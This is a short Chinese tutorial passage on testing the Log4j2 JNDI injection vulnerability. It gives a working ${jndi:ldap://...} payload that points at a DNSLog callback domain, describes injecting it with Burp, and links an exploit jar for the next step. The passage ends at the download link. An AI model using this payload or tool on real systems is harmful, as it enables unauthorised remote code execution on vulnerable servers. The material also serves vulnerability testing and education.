	Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息

通过DNSLog平台（[http://www.dnslog.cn/](https://link.zhihu.com/?target=http%3A//www.dnslog.cn/)）获取到域名[http://n0t5wh.dnslog.cn](https://link.zhihu.com/?target=http%3A//n0t5wh.dnslog.cn)，构造payload ${jndi:ldap://[http://n0t5wh.dnslog.cn](https://link.zhihu.com/?target=http%3A//n0t5wh.dnslog.cn)}，游览器点击?????使用Burp进行抓包，并且抓包替换payload参数

在DNSLog网站成功收到解析记录：

就可使用JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行漏洞利用：
下载地址：[https://github.com/welk1n/JNDI-](https://link.zhihu.com/?target=https%3A//github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0)

